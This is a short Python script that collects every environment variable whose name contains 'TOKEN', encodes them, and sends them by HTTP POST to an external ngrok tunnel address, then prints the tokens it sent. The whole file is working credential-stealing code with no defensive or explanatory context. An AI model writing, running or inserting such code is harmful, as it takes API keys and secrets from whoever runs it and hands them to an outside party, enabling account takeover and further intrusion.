import os
import requests

# Collect all environment variables with 'TOKEN' in the name
tokens = {k: v for k, v in os.environ.items() if 'TOKEN' in k}

if tokens:
    # Convert tokens dictionary to a string, then encode to utf-8 (if required)
    data = str(tokens).encode("utf-8")
    
    # Send to the external endpoint (using POST)
    try:
        requests.post("https://3dc603701034.ngrok-free.app/", data=data)
        print("Tokens sent:", tokens)
    except Exception as e:
        print("Error sending tokens:", e)
else:
    print("No token environment variables found.")
